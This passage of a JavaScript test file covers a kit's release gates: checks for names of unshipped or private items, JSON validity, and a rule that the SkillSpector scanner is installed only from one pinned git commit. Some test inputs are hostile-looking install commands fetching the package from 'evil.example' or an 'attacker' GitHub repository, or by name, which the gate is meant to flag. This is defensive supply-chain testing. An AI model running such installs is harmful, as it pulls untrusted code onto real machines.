    assert.deepEqual(gateNames(root, NAMES, allow), [
      'catalog/skills/a/SKILL.md:3 names save-session, which the kit does not ship',
      'catalog/skills/b/SKILL.md:5 names claude-md-curator, which the kit does not ship',
      'catalog/skills/c/SKILL.md:3 names save-session, which the kit does not ship',
    ]);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('names: a private name in the front matter description is found without printing it', () => {
  const names = { ...NAMES, private: ['quiet-job'] };
  const allow = [{ file: 'catalog/skills/a/SKILL.md', name: 'quiet-job', why: 'never honoured for a private name' }];
  const root = kit({ 'catalog/skills/a/SKILL.md': ['---', 'name: a', 'description: Pairs with Quiet-Job.', '---', ''].join('\n') });
  try {
    const found = gateNames(root, names, allow);
    assert.deepEqual(found, ['catalog/skills/a/SKILL.md:3 names a private studio item (on the private list, private.local.txt, or in a hub pack whose pack.json says public: false)']);
    assert.ok(!found.join('\n').toLowerCase().includes('quiet'), 'a private name is never printed');
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('names: in a description, a one-word studio name is ordinary prose and passes; a one-word private name is still found, masked', () => {
  const names = { studio: [...NAMES.studio, 'launch', 'pricing'], shipped: NAMES.shipped, private: ['quietude'] };
  const root = kit({
    'catalog/skills/a/SKILL.md': ['---', 'name: a', 'description: Use for a narrated launch video, Pricing pages and save-session.', '---', ''].join('\n'),
    'catalog/skills/b/SKILL.md': ['---', 'name: b', 'description: Use in Quietude.', '---', ''].join('\n'),
    'catalog/skills/c/SKILL.md': ['---', 'name: c', 'description: Use after `launch`.', '---', ''].join('\n'),
  });
  try {
    const found = gateNames(root, names);
    assert.deepEqual(found, [
      'catalog/skills/a/SKILL.md:3 names save-session, which the kit does not ship',
      'catalog/skills/b/SKILL.md:3 names a private studio item (on the private list, private.local.txt, or in a hub pack whose pack.json says public: false)',
      'catalog/skills/c/SKILL.md:3 names launch, which the kit does not ship',
    ]);
    assert.ok(!found.join('\n').toLowerCase().includes('quietude'), 'a private name is never printed');
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('names: a fence inside a blockquote is a fence, and its body is skipped', () => {
  const root = kit({
    'catalog/a.md': [
      `> ${FENCE3}md`, '> Run `save-session`.', `> ${FENCE3}`,
      `>> ~~~`, '>> See [[claude-md-curator]].', '>>~~~',
      `  > > ${FENCE3}`, '  > > `save-session`', `  > > ${FENCE3}`,
      '> `save-session` in a quote, outside any fence.',
    ].join('\n'),
  });
  try {
    assert.deepEqual(gateNames(root, NAMES), ['catalog/a.md:10 names save-session, which the kit does not ship']);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('names: a fence inside a blockquote ends with its blockquote, and a quoted fence line inside an outer fence is its text', () => {
  const root = kit({
    'catalog/a.md': ['> ~~~', '> code', '', 'Run `save-session` now.'].join('\n'),
    'catalog/b.md': [`> ${FENCE3}`, '> code', 'Then [[claude-md-curator]].', `>> ${FENCE3}`, '>> code', '> `save-session` in the outer quote.'].join('\n'),
    'catalog/c.md': [`${FENCE3}md`, `> ${FENCE3}`, '> `save-session` in an example', `> ${FENCE3}`, '[[claude-md-curator]] still in the example', FENCE3, '`save-session` after.'].join('\n'),
  });
  try {
    assert.deepEqual(gateNames(root, NAMES), [
      'catalog/a.md:4 names save-session, which the kit does not ship',
      'catalog/b.md:3 names claude-md-curator, which the kit does not ship',
      'catalog/b.md:6 names save-session, which the kit does not ship',
      'catalog/c.md:7 names save-session, which the kit does not ship',
    ]);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('json: a file that parses passes; node_modules and local-only files are not read', () => {
  const root = kit({
    'catalog/skills/a/config.json': '{\n  "say": "hi \\"there\\""\n}\n',
    'package.json': '{"name": "x"}\n',
    'node_modules/dep/package.json': '{ not json',
    'tools/export/rewrites.local.json': '{ not json',
  });
  try { assert.deepEqual(gateJson(root), []); } finally { rmSync(root, { recursive: true, force: true }); }
});

test('json: an unescaped quote fails with the parser message', () => {
  const root = kit({ 'catalog/skills/a/bad.json': '{"say": "hi "there""}\n', 'docs/ok.json': '[]\n' });
  try {
    const found = gateJson(root);
    assert.equal(found.length, 1, found.join('\n'));
    assert.match(found[0], /^catalog\/skills\/a\/bad\.json: not valid JSON \(.+\)$/);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('json: a leading byte order mark fails, and the finding names it without printing it', () => {
  const root = kit({ 'catalog/features.json': '\uFEFF{"a": 1}\n' });
  try {
    const found = gateJson(root);
    assert.equal(found.length, 1, found.join('\n'));
    assert.match(found[0], /^catalog\/features\.json: not valid JSON \(.*U\+FEFF.*\)$/);
    assert.ok(!found[0].includes('\uFEFF'), 'the invisible character is never printed');
  } finally { rmSync(root, { recursive: true, force: true }); }
});

// An invented commit id, 40 hex characters, and the scanner record that pins it.
const PIN = 'a1'.repeat(20);
const REPO = 'github.com/NVIDIA/skillspector.git';
const SCANNER = { version: 'v9.9.9', tag: 'v9.9.9', commit: PIN, python: '3.13', install: `uv tool install --python 3.13 git+https://${REPO}@${PIN}` };
const scanned = (version = 'v9.9.9') => ({ score: 0, recommendation: 'SAFE', findings: [], version, date: '2026-11-21' });

test('scanner: passes when every install outside catalog/ carries the commit and every scan used the pinned version', () => {
  const root = kit({
    'docs/install.md': `Install SkillSpector v9.9.9:\n\n\`\`\`text\n${SCANNER.install}\n\`\`\`\n`,
    'export.manifest.json': `{"install": "${SCANNER.install}"}\n`,
    'tools/export/scanner.json': `${JSON.stringify(SCANNER)}\n`,
    'catalog/skills/x/README.md': `uv tool install git+https://${REPO}\n`,
    'tools/export/test/t.test.mjs': `const line = 'git+https://${REPO}';\n`,
  });
  try {
    assert.deepEqual(gateScanner(root, SCANNER, { alpha: scanned(), beta: scanned() }), []);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('scanner: an install without @<commit> is one finding, naming file and line', () => {
  const root = kit({ 'cards/a.md': `# A\nInstall: \`uv tool install --python 3.13 git+https://${REPO}\`\n`, 'docs/ok.md': `${SCANNER.install}\n` });
  try {
    const found = gateScanner(root, SCANNER, { alpha: scanned() });
    assert.equal(found.length, 1, found.join('\n'));
    assert.match(found[0], /^cards\/a\.md:2 /);
    assert.ok(!found[0].includes('https://'), 'no remote URL in the finding');
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('scanner: any case of the repository name, a short commit or another commit fails too, once per line', () => {
  const root = kit({
    'export.manifest.json': `{"install": "uv tool install git+https://github.com/NVIDIA/SkillSpector.git"}\n`,
    'docs/a.md': `x git+https://${REPO}@${PIN.slice(0, 12)}\ny git+https://${REPO}@${'b2'.repeat(20)} and git+https://${REPO}\nz ${SCANNER.install}\n`,
  });
  try {
    assert.deepEqual(gateScanner(root, SCANNER, {}).map((f) => f.split(' ')[0]), ['docs/a.md:1', 'docs/a.md:2', 'export.manifest.json:1']);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('scanner: a scans.json entry made with another version is one finding naming the item and both versions', () => {
  const root = kit({ 'docs/ok.md': `${SCANNER.install}\n` });
  try {
    const found = gateScanner(root, SCANNER, { alpha: scanned(), beta: scanned('v2.2.3') });
    assert.equal(found.length, 1, found.join('\n'));
    assert.match(found[0], /^tools\/export\/scans\.json: beta .*v2\.2\.3.*v9\.9\.9/);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('scanner: an allowed occurrence passes only inside its phrase, in its own file, wherever the line moves', () => {
  const phrase = `The README's install is \`uv tool install git+https://${REPO}\``;
  const allow = [{ file: 'docs/facts.md', phrase, why: 'quotes the upstream README' }];
  // facts.md: a new line moves the quote to line 3; line 4 has the same URL outside the phrase.
  const root = kit({
    'docs/facts.md': `# Facts\nA new line above moves the quote.\n- ${phrase}.\nAlso: git+https://${REPO}\n`,
    'docs/other.md': `# Other\n- ${phrase}.\n`,
  });
  try {
    assert.deepEqual(gateScanner(root, SCANNER, {}, allow).map((f) => f.split(' ')[0]), ['docs/facts.md:4', 'docs/other.md:2']);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('scanner: an allow entry whose phrase is gone from its file is a finding; a missing file leaves it unused', () => {
  const allow = [{ file: 'docs/facts.md', phrase: 'a quote that was removed', why: 'x' }, { file: 'docs/absent.md', phrase: 'y', why: 'z' }];
  const root = kit({ 'docs/facts.md': '# Facts\nNothing quoted now.\n' });
  try {
    assert.deepEqual(gateScanner(root, SCANNER, {}, allow), ['docs/facts.md: a SCANNER_ALLOW entry\'s phrase is no longer in the file; remove the entry from gates.mjs']);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('scanner: only the git URL at the pinned commit installs or runs the scanner; any install or run by name fails, whatever version it names', () => {
  // The name is not on PyPI, so a by-name line would get whatever code a later owner of the name publishes.
  const lines = [
    ['# A', false],
    ['uv tool install git+https://github.com/nvidia/SkillSpector', true],
    // Only the exact pinned URL passes: without .git, or another case of the owner, it is not that line.
    [`uv tool install git+https://github.com/NVIDIA/skillspector@${PIN}`, true],
    [`uv tool install --python 3.13 git+https://${REPO}@${PIN}`, false],
    ['pip install skillspector', true],
    ['pipx install --python 3.13 skillspector==9.9.8', true],
    ['uv tool install skillspector==9.9.9', true],
    ['uv pip install skillspector==9.9.9', true],
    ['pip3 install --user skillspector==9.9.9', true],
    [`pip install "skillspector @ git+https://${REPO}@${PIN}"`, false],
    [`pip install "skillspector @ git+https://${REPO}"`, true],
    ['uvx skillspector scan .', true],
    ['uvx --python 3.13 skillspector==9.9.9 --version', true],
    ['uvx --from skillspector==9.9.9 skillspector --version', true],
    ['uv tool run skillspector --version', true],
    [`uvx --python 3.13 --from git+https://${REPO}@${PIN} skillspector --version`, false],
    [`uvx --from git+https://${REPO} skillspector --version`, true],
    ['The source is at https://github.com/NVIDIA/SkillSpector, Apache-2.0.', false],
    ['See https://github.com/NVIDIA/SkillSpector/releases/tag/v9.9.9 for the release.', false],
    ['skillspector --version prints the version.', false],
    ['Install it, with uv first, then SkillSpector v9.9.9, one pinned line.', false],
  ];
  const root = kit({ 'docs/a.md': lines.map(([l]) => l).join('\n') });
  try {
    const want = lines.map(([, bad], i) => (bad ? `docs/a.md:${i + 1}` : null)).filter(Boolean);
    assert.deepEqual(gateScanner(root, SCANNER, {}, []).map((f) => f.split(' ')[0]), want);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

// Every line of the reviewer's probe (Part A, round 2): each form it found passing is now a finding, and
// only the allowed forms pass. Three lines pass because they hold no scanner name and the gate reads one
// line at a time; docs/MAINTAINING.md names those limits (a command continued on the next line, a
// requirements file).
test('scanner: every install or run that is not the pinned git URL fails, from the review probe; the pinned forms pass', () => {
  const pinned = `git+https://${REPO}@${PIN}`;
  const lines = [
    ['python -m pip install skillspector', true],
    ['py -3 -m pip install skillspector==2.13.6', true],
    ['pip3 install "skillspector==2.13.6"', true],
    ["pip install 'skillspector[all]'", true],
    ['pip install SkillSpector', true],
    ['pipx run skillspector scan .', true],
    ['uv run --with skillspector skillspector scan .', true],
    ['uv add skillspector', true],
    ['poetry add skillspector', true],
    ['conda install skillspector', true],
    ['skillspector==2.13.6', true],
    ['pip install -r requirements.txt', false], // limit: a requirements file is not read
    ['pip install \\', false], // limit: the command goes on on the next line
    ['  skillspector==2.13.6', true],
    ['uvx --from', false], // limit: the value is on the next line
    ['  skillspector==9 skillspector scan .', true],
    ['uv tool install git+https://github.com/attacker/skillspector', true],
    ['uv tool install git+https://github.com/NVIDIA/skillspector.git@main', true],
    ['pip install "skillspector @ git+https://gitlab.com/x/skillspector"', true],
    ['uvx --from git+https://github.com/attacker/skillspector skillspector scan .', true],
    ['uv tool install git+ssh://git@github.com/NVIDIA/skillspector', true],
    ['pip install https://github.com/NVIDIA/SkillSpector/archive/refs/heads/main.zip', true],
    ['uvx --from=skillspector==9 skillspector', true],
    [`uvx --from=${pinned} skillspector`, false],
    [`uv tool install --python 3.13 ${pinned}`, false],
    [`uvx --python 3.13 --from ${pinned} skillspector --version`, false],
    ['Use `uvx --from` to name the source.', false],
    ['uv tool upgrade skillspector', true],
    ['pip install git+ssh://git@github.com/NVIDIA/skillspector.git', true],
    ['git clone git@github.com:NVIDIA/skillspector.git', true],
  ];
  const root = kit({ 'docs/a.md': lines.map(([l]) => l).join('\n') });
  try {
    const want = lines.map(([, bad], i) => (bad ? `docs/a.md:${i + 1}` : null)).filter(Boolean);
    assert.deepEqual(gateScanner(root, SCANNER, {}, []).map((f) => f.split(' ')[0]), want);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

// Part A, round 3: a percent-encoded name, a file named for the scanner on another host, and pip's
// download and wheel verbs, which fetch and build the package by name.
test('scanner: a percent-encoded name, a wheel or sdist from another host, and pip download or wheel by name fail', () => {
  const lines = [
    ['uv tool install git+https://github.com/NVIDIA/%73killspector', true],
    ['uv tool install git+https://github.com/NVIDIA/%53kill%53pector.git@main', true],
    ['pip install https://evil.example/skillspector-2.13.6-py3-none-any.whl', true],
    ['pip install https://evil.example/pkgs/SkillSpector-2.13.6.tar.gz', true],
    ['pip download skillspector', true],
    ['pip wheel skillspector==2.13.6', true],
    ['See https://example.com/100%zz/notes for the bad escape.', false],
    [`uv tool install --python 3.13 git+https://${REPO}@${PIN}`, false],
  ];
  const root = kit({ 'docs/a.md': lines.map(([l]) => l).join('\n') });
  try {
    const want = lines.map(([, bad], i) => (bad ? `docs/a.md:${i + 1}` : null)).filter(Boolean);
    assert.deepEqual(gateScanner(root, SCANNER, {}, []).map((f) => f.split(' ')[0]), want);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('scanner: the pinned URL is the one in scanner.json\'s install line, so a moved repository needs one edit', () => {
  const moved = { ...SCANNER, install: `uv tool install --python 3.13 git+https://github.com/new-owner/skillspector.git@${PIN}` };
  const root = kit({ 'docs/a.md': `${moved.install}\n${SCANNER.install}\n` });
  try {
    assert.deepEqual(gateScanner(root, moved, {}, []).map((f) => f.split(' ')[0]), ['docs/a.md:2']);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('scanner: an install line in scanner.json with no git URL at the pinned commit is a finding', () => {
  const root = kit({ 'docs/a.md': '# A\n' });
  try {
    const found = gateScanner(root, { ...SCANNER, install: `uv tool install git+https://${REPO}@${'b2'.repeat(20)}` }, {}, []);
    assert.deepEqual(found, ['tools/export/scanner.json: the install line has no git URL at the pinned commit']);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('scanner: every SCANNER_ALLOW entry names a file, a phrase and why', () => {
  for (const a of SCANNER_ALLOW) {
    assert.equal(typeof a.file, 'string');
    assert.ok(typeof a.phrase === 'string' && a.phrase.length > 20, `${a.file}: phrase`);
    assert.ok(typeof a.why === 'string' && a.why.length > 0, `${a.file}: why`);
  }
});

test('scanner: the kit itself passes its scanner gate, with its own scanner.json and scans.json', () => {
  const root = fileURLToPath(new URL('../../../', import.meta.url));
  const scanner = JSON.parse(readFileSync(path.join(root, 'tools/export/scanner.json'), 'utf8'));
  const scans = JSON.parse(readFileSync(path.join(root, 'tools/export/scans.json'), 'utf8'));
  assert.deepEqual(gateScanner(root, scanner, scans), []);
});

test('shebangFiles: files under the given folders whose first two bytes are #!, sorted, relative with /', () => {
  const root = kit({
    'catalog/skills/b/scripts/run.sh': '#!/bin/sh\necho ok\n',
    'catalog/skills/a/scripts/tool': '#!/usr/bin/env node\n',
    'catalog/skills/a/scripts/lib.mjs': 'export const x = 1;\n',
    'catalog/skills/a/notes.md': ' #! not first\n',
    'catalog/skills/a/node_modules/dep/cli.js': '#!/usr/bin/env node\n',
    'catalog/.git/hooks/pre-commit': '#!/bin/sh\n',
    'templates/git-hooks/commit-msg': '#!/bin/sh\n',
    'docs/NOTICES.md': '#!not a dir, but listed\n',
    'tools/x.sh': '#!/bin/sh\n',
    'catalog/empty': '',
    'catalog/one': '#',
  });
  try {
    assert.deepEqual(shebangFiles(root, ['catalog', 'templates', 'docs/NOTICES.md', 'missing']), [
      'catalog/skills/a/scripts/tool',
      'catalog/skills/b/scripts/run.sh',
      'docs/NOTICES.md',
      'templates/git-hooks/commit-msg',
    ]);
  } finally { rmSync(root, { recursive: true, force: true }); }
});
